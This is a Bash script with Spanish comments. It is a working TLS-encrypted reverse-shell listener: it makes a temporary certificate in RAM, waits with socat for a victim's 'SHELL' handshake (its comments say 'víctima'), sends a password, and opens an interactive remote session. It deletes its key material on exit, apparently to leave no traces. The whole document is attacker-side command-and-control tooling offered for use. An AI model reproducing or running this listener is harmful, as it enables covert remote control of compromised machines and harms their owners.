#!/bin/bash
PORT=${1:-4444}
PASS=$2

if [ -z "$PASS" ]; then echo "Uso: $0 <puerto> <pass>"; exit 1; fi

# --- MOSTRAR INTERFACES DE RED ---
echo -e "\e[1;34m[*] Interfaces disponibles:\e[0m"
IP_RAW=$(ip -4 -o addr show 2>&1)
if [[ "$IP_RAW" == *"Permission denied"* ]] || [[ -z "$IP_RAW" ]] || [[ "$IP_RAW" == *"not found"* ]]; then
    if command -v ifconfig &> /dev/null; then
        ifconfig 2>/dev/null | awk '/inet / {print $1 " " $2}' | grep -v "127.0.0.1" | head -n 5 | while read -r line; do
            iface=$(echo $line | awk '{print $1}' | sed 's/://'); ip_addr=$(echo $line | awk '{print $2}' | sed 's/addr://')
            echo -e "    \e[1;33m→\e[0m $iface - $ip_addr"
        done
    fi
else
    echo "$IP_RAW" | awk '{print $2 " - " $4}' | cut -d/ -f1 | grep -v "lo" | head -n 5 | while read -r line; do
        echo -e "    \e[1;33m→\e[0m $line"
    done
fi
echo ""

# --- VERIFICACIÓN DE DEPENDENCIAS ---
DEPS=("socat" "openssl")
for tool in "${DEPS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "\e[1;31m[!]\e[0m $tool no encontrado. Intentando instalar..."
        if command -v pkg &> /dev/null; then pkg install -y "$tool"
        elif command -v apt-get &> /dev/null; then sudo apt-get update && sudo apt-get install -y "$tool"; fi
    fi
done

# --- CERTIFICADOS ---
RAM_DIR="/dev/shm"; [ ! -d "$RAM_DIR" ] && RAM_DIR="/tmp"; [ ! -w "$RAM_DIR" ] && RAM_DIR="."
CERT="$RAM_DIR/cert.pem"; KEY="$RAM_DIR/key.pem"; COMBINED="$RAM_DIR/server.pem"
openssl req -x509 -newkey rsa:4096 -keyout "$KEY" -out "$CERT" -days 1 -nodes -subj "/C=US/O=Dev/CN=localhost" 2>/dev/null
cat "$KEY" "$CERT" > "$COMBINED"

# Limpieza total al salir con CTRL+C
trap "rm -f $KEY $CERT $COMBINED; echo -e '\n\e[1;31m[-]\e[0m Listener cerrado. RAM limpia.'; exit" SIGINT

# --- BUCLE INFINITO DE ESCUCHA ---
while true; do
    echo -e "\e[1;32m[+]\e[0m Esperando TLS en puerto \e[1;33m$PORT\e[0m..."
    
    # 1. Fase de Handshake (Captura la identificación de la víctima)
    # Si nadie se conecta en 60 segundos, socat se reinicia solo para limpiar sockets zombies
    IDENT=$(socat -T 60 OPENSSL-LISTEN:$PORT,cert=$COMBINED,verify=0,reuseaddr - 2>/dev/null | head -n 1 | tr -d '\r\n')
    
    if [[ "$IDENT" == *"SHELL"* ]]; then
        echo -e "[*] Handshake: \e[1;36m$IDENT\e[0m. Autenticando..."
        
        # 2. Fase de Sesión
        # Enviamos la contraseña y entramos en modo interactivo (cat)
        # Si la conexión se cae o el cliente cierra, socat termina y el bucle vuelve arriba
        (sleep 1; echo "$PASS"; cat) | socat OPENSSL-LISTEN:$PORT,cert=$COMBINED,verify=0,reuseaddr - 2>/dev/null
        
        echo -e "\n\e[1;34m[*]\e[0m Conexión finalizada / Intento fallido."
    else
        [ -n "$IDENT" ] && echo -e "\e[1;31m[!]\e[0m Handshake inválido: '$IDENT'"
    fi
    
    # Pequeña pausa para evitar consumo de CPU si hay ataques de denegación de servicio (spam de conexiones)
    sleep 1
done
